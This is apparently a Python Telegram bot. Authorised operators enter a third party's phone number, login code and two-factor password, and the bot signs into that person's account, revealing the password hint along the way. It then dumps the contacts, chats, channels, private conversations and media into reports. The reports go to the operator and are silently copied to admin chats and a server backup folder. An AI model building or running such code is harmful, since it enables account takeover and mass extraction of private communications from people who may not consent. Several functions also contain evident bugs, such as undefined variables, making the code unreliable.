import logging
import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
from dotenv import load_dotenv
from datetime import datetime
from defunc import *
import pytz
from allowed_users import ALLOWED_USERS  # Импортируем словарь из отдельного файла
from aiogram.types import InlineKeyboardMarkup as AiogramInlineKeyboardMarkup, \
                          InlineKeyboardButton as AiogramInlineKeyboardButton, \
                          CallbackQuery as AiogramCallbackQuery


# Загрузка переменных окружения из файла .env
load_dotenv()

# Получение значений из переменных окружения
api_id = os.getenv("API_ID")
api_hash = os.getenv("API_HASH")
bot_token = os.getenv("BOT_TOKEN")
admin_chat_ids_str = os.getenv("ADMIN_CHAT_IDS")
admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
allowed_users = ALLOWED_USERS

# Создаем Bot и Dispatcher
bot = Bot(token=bot_token)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())
logging.basicConfig(level=logging.INFO)

# Логирование
logging.basicConfig(level=logging.INFO)

# Словарь для хранения состояния пользователя
user_state = {}

# Функция для отображения клавиатуры
async def show_keyboard(message: Message):
    keyboard = AiogramInlineKeyboardMarkup(row_width=1)
    buttons = [
        AiogramInlineKeyboardButton(text="Отчет без медиа", callback_data='withoutall'),
        AiogramInlineKeyboardButton(text="Отчет с фото", callback_data='with_photos'),
        AiogramInlineKeyboardButton(text="Отчет с фото + скачивание всех медиа", callback_data='get_media')
    ]
    keyboard.add(*buttons)
    await message.answer("Выберите вариант загрузки", reply_markup=keyboard)



#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Обработчики кнопок!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        user_state[user_id] = {
            'connected': False,
            'type': "",
            'selection':""
        }
        await message.answer("Введите номер телефона")
        now_utc = datetime.now(pytz.utc)
        timezone = pytz.timezone('Europe/Moscow')
        now_local = now_utc.astimezone(timezone)
        now = now_local.strftime("%Y-%m-%d %H:%M:%S")
        user_name = ALLOWED_USERS[user_id]
        user_info_message = f"Авторизованный пользователь: ({user_name}, id: {user_id}) запустил бота.\nДата и время запуска: {now}"
        for admin_chat_id in admin_chat_ids:
            await bot.send_message(admin_chat_id, user_info_message)
    else:
        await unauthorized(message)


@dp.message_handler(commands=['analytic'])
async def analytic_command(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_state:
        user_state[user_id] = {}     
    user_state[user_id]['type'] = '' #обнуляем, чтобы после аналитики не реагировала на цифры
    if user_id in user_state and user_state[user_id].get('connected'):
        logging.info(f"User {user_id} is connected. Starting analysis.")
        phone_number = user_state[user_id]['phone_number']
        client = user_state[user_id]['client']
        try:
            await message.answer("Начинаю анализ данных...")
            await process_user_data(client, phone_number, user_id)
        except Exception as e:
            logging.error(f"Error during analysis for user {user_id}: {e}")
            await message.answer(f"Произошла ошибка при анализе: {e}")
    else:
        logging.info(f"User {user_id} is not connected. Cannot perform analysis.")
        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")


@dp.message_handler(commands=['private'])
async def select_mode_of_download(message: types.Message):
    user_id = message.from_user.id
    if user_id in user_state and user_state[user_id].get('connected'):
        await show_keyboard(message)
        user_state[user_id]['type'] = 'private'
        user_state[user_id]['selection']=''
    else:
        logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
      

@dp.message_handler(commands=['exit'])
async def say_by(message: types.Message):
    user_id = message.from_user.id
    if 'client' in user_state.get(user_id, {}):
      client = user_state[user_id]['client']
      await client.log_out()
      await client.disconnect()
      user_state.pop(message.from_user.id, None)
      await message.answer("Вы разлогинились.")
    else:
      await message.answer("Не требуется. Вы не подключены.")


# Обработчики колбэков для запуска нужных функций
#@dp.callback_query_handler(lambda query: 'get_private' in user_state.get(query.from_user.id, {}))
@dp.callback_query_handler(lambda query: bool(user_state.get(query.from_user.id, {}).get('type'))) #Перехват, когда список не пустой
async def callback_query_handler(callback_query: AiogramCallbackQuery):
    logging.info(f"Callback query data: {callback_query.data}")
    user_id = callback_query.from_user.id
    code = callback_query.data
    if code == 'withoutall':
        selection = '40'
        selection_alias = 'Отчет без медиа'
    elif code == 'with_photos':
        selection = '45'
        selection_alias = 'Отчет с фото'
    elif code == 'get_media':
        selection = '450'
        selection_alias = 'Отчет с фото + скачивание всех медиа в zip'
    user_state[user_id]['selection'] = selection
    if selection in ['40', '45', '450']:
        #if user_id in user_state and user_state[user_id].get('connected'): #надо подумать, нужна ли
        await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
        logging.info(f"User {user_id} is connected. Starting get private message.")
        client = user_state[user_id]['client']
        try:
                user_dialogs, i, users_list = await get_user_dialogs(client)
                if not user_dialogs:
                    await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
                    return
                else:
                    # Сохраняем user_id и users_list в user_state для дальнейшего использования
                    user_state[user_id]['users_list'] = users_list
                    user_state[user_id]['dialogs_count'] = i        
                    dialog_message = "\n".join(user_dialogs)
                    await bot.send_message(user_id, dialog_message)
                    await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
        
        except Exception as e:
                logging.error(f"Error during making list: {e}")
                await message.answer(f"Произошла ошибка при формирование списка: {e}")
    elif selection in ['70', '75', '750']:      
      pass

# Обработчик выбора списка приватного диалого для выгрузки, если get_private равно True
@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('type') == 'private' and
                                  message.text.isdigit() and 1 <= len(message.text) <= 4)
async def get_private_message_from_list(message: types.Message):
    user_id = message.from_user.id
    
    client = user_state[user_id]['client']
    users_list = user_state[user_id]['users_list']
    i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
    g_index = int(message.text.strip()) 
    if user_id in user_state and 'selection' in user_state[user_id]:
        selection = user_state[user_id]['selection']
        try:
            if 0 <= g_index < i:
                target_user = users_list[g_index]
                await message.answer(f"начинаю выгрузку диалога под номеом: {g_index}. Дождись сообщение о завершении")
                await get_messages_for_html(client, target_user, selection)
                await message.answer("Выгрузка завершена. Отправляю файлы")
                await send_files_to_bot(bot, admin_chat_ids, user_id)
            else:
              await message.answer(f"Введите число от 0 до {i-1}, соотвествующее номеру диалога.")
        except ValueError:
            await message.answer("Введите число, соотвествующее диалогу.")

# Обработчики сообщений
@dp.message_handler(lambda message: message.from_user.id not in allowed_users)
async def unauthorized(message: types.Message):
    await message.answer("Бот не работает, попробуйте позже")
    now_utc = datetime.now(pytz.utc)
    timezone = pytz.timezone('Europe/Moscow')
    now_local = now_utc.astimezone(timezone)
    now = now_local.strftime("%Y-%m-%d %H:%M:%S")
    user_id = message.from_user.id
    
    user_info_message=f'Попытка запуска бота НЕАВТОРИЗОВАННЫМ пользователем ID:{user_id}.\nДата и время запуска: {now}'
    for admin_chat_id in admin_chat_ids:
            await bot.send_message(admin_chat_id, user_info_message)


#Введен номер
@dp.message_handler(lambda message: message.text and 
                    len(re.sub(r'\D', '', message.text)) > 9 and 
                    message.from_user.id in allowed_users)
async def get_phone_number(message: types.Message):
    phone_number = message.text
    # Очищаем номер телефона от всего, кроме цифр
    phone_number = re.sub(r'\D', '', phone_number)
    phone_number = f"+{phone_number}"
    try:
        # Создаем новый экземпляр клиента
        client = create_client()
        await client.connect()
        
        # Разлогиниваемся от предыдущего клиента, если он был авторизован
        if await client.is_user_authorized():
            await client.log_out()
        
        sent_code = await client.send_code_request(phone_number)
        user_state[message.from_user.id] = {
            'phone_number': phone_number,
            'attempts': 0,
            'phone_code_hash': sent_code.phone_code_hash,  # Извлекаем хеш кода
            'client': client,
            'connected': False,
            '': "",
            'selection':""
        }
        await message.reply("Код отправлен на телефон клиента. Введите полученный ПИН")
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")


# Введен пин-код
@dp.message_handler(lambda message: message.text and 
                    'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                    'awaiting_password' not in user_state.get(message.from_user.id, {}) and not
                    user_state.get(message.from_user.id, {}).get('connected', False))

async def get_code(message: types.Message):
    code = message.text
    phone_number = user_state[message.from_user.id]['phone_number']
    phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
    user_id = message.from_user.id  # Добавляем определение user_id
    client = user_state[message.from_user.id].get('client', create_client())  # Используем существующий клиент или создаем новый

    try:
        await client.connect()
        await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
        await message.answer("Подключено! Выбери в меню бота одну из опций")
        user_state[user_id]['connected'] = True  # Обновляем состояние
        await get_and_send_contacts(client, phone_number, user_id)
    except SessionPasswordNeededError:
        await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
        user_state[message.from_user.id]['awaiting_password'] = True
        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
        user_state[message.from_user.id]['password_attempts'] = 0  # Инициализируем попытки ввода пароля
        password_info = await client(functions.account.GetPasswordRequest())
        password_info_hint = f'Подсказка для пароля: {password_info.hint}'
        await message.answer(password_info_hint)
    except PhoneCodeInvalidError:
        user_state[message.from_user.id]['code_attempts'] = user_state[message.from_user.id].get('code_attempts', 0) + 1
        if user_state[message.from_user.id]['code_attempts'] >= 3:
            await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
            user_state.pop(message.from_user.id, None)
            await client.log_out()
            await client.disconnect()
        else:
            await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
    except Exception as e:
        await message.answer(f"Произошла ошибка: {e}")
    finally:
        if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
            if 'code_attempts' not in user_state.get(message.from_user.id, {}):
                await client.log_out()
                await client.disconnect()
                



#Введен пароль
@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}) and not
                    user_state.get(message.from_user.id, {}).get('connected', False))
async def process_password(message: types.Message):
    password = message.text
    user_id = message.from_user.id  # Определяем user_id
    if user_id in user_state:
        client = user_state[user_id]['client']
        try:
            await client.connect()
            await client.sign_in(password=password)
            user_state[user_id]['connected'] = True  # Обновляем состояние
            await message.answer("Подключено! Выбери в меню бота одну из опций")
            phone_number = user_state[user_id]['phone_number']
            await get_and_send_contacts(client, phone_number, user_id)
        except PasswordHashInvalidError:
            user_state[user_id]['password_attempts'] += 1
            if user_state[user_id]['password_attempts'] >= 3:
                await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
                user_state.pop(user_id, None)
                await client.log_out()
                await client.disconnect()
            else:
                await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[user_id]['password_attempts']} из 3.")
        except Exception as e:
            await message.answer(f"Произошла ошибка: {e}")
        finally:
            if 'awaiting_password' not in user_state.get(user_id, {}):
                await client.log_out()
                await client.disconnect()
    else:
        await message.answer("Произошла ошибка: пользователь не найден в системе")


# Функция для создания нового экземпляра клиента
def create_client():
    return TelegramClient('session_name', api_id, api_hash)


#Функция для выгрузки контактов 
async def get_and_send_contacts(client, phone_number, user_id):
  selection = '0'
  needsavecontacts = '1'
  userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
  total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username, needsavecontacts)
  await send_files_to_bot(bot, admin_chat_ids, user_id)
  
# Функция для обработки данных пользователя
async def process_user_data(client, phone_number, user_id):
    selection = '0'
    needsavecontacts = '0'
    try:
        userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html, list_botblocked = await get_blocked_bot(client, selection)
        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
        total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username, needsavecontacts)
        #await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
        bot_from_search, bot_from_search_html = await get_bot_from_search(client, phone_number, selection, list_botblocked, list_botexisted)
        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id, photos_user_html, bot_from_search_html)
        await send_files_to_bot(bot, admin_chat_ids, user_id)
    except Exception as e:
        logging.error(f"Error processing user data: {e}")


import os
import shutil
from datetime import datetime

# Определяем функцию для копирования файлов в папку files_from_svarog
def copy_files_to_backup_folder(file_to_copy, backup_folder):
    # Создаем подпапку с именем текущей даты и user_id, если ее нет
    current_date = datetime.now().strftime('%d.%m.%Y')
    backup_subfolder = os.path.join(backup_folder, f'{current_date}_{user_chat_id}')
    os.makedirs(backup_subfolder, exist_ok=True)
    
    # Копируем файл в созданную подпапку
    shutil.copy(file_to_copy, backup_subfolder)

async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html', '_chat_messages.html', '_media_files.zip']
    max_file_size = 49 * 1024 * 1024  # 49 MB в байтах
    now_utc = datetime.now(pytz.utc)
    timezone = pytz.timezone('Europe/Moscow')
    now_local = now_utc.astimezone(timezone)
    now = now_local.strftime("%Y-%m-%d %H:%M:%S")
    user_id=user_chat_id
    user_name = ALLOWED_USERS[user_id]
    max_file_size = 49 * 1024 * 1024  # 49 MB в байтах
  
    if user_state.get(user_id, {}).get('selection') and user_state.get(user_id, {}).get('type'):
      selection = user_state[user_id]['selection']
      type = user_state[user_id]['type']
      user_info_message = f"Дата и время выгрузки: {now} \nВыгрузка осуществлена: ({user_name}, {user_id}). Режим: ({type}/{selection})"
    else:
      user_info_message = f"Дата и время выгрузки: {now} \nВыгрузка осуществлена: ({user_name}, {user_id}):"

    # Отправка сообщения с информацией о пользователе админам
    for admin_chat_id in admin_chat_ids:
        await bot.send_message(admin_chat_id, user_info_message)

  
    # Отправка файлов с информацией пользователю и админам
    for file_extension in file_extensions:
        files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
    
        for file_to_send in files_to_send:
            send_successful = True  # Переменная для отслеживания успешной отправки
            for chat_id in [user_chat_id] + admin_chat_ids:
                try:
                    if os.path.getsize(file_to_send) <= max_file_size:  # Проверка размера файла
                        with open(file_to_send, "rb") as file:
                            await bot.send_document(chat_id, file)
                    else:
                        await bot.send_message(chat_id, f"Файл {file_to_send} слишком большой и не будет отправлен. Обратитесь к администратору, чтобы его получить")
                        send_successful = False
                        break  # Прерываем отправку в текущий чат, так как файл слишком большой
                except Exception as e:
                    print(f"Ошибка при отправке файла {file_to_send} в чат {chat_id}: {e}")
                    send_successful = False
                    break  # Прерываем отправку в текущий чат из-за ошибки
        
            if send_successful:
                 # Копируем файл в папку files_from_svarog перед удалением
                await copy_files_to_backup_folder(file_to_send, '/app/data')
                os.remove(file_to_send)  # Удаляем файл только если он был успешно отправлен всем из списка

# Запуск бота
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
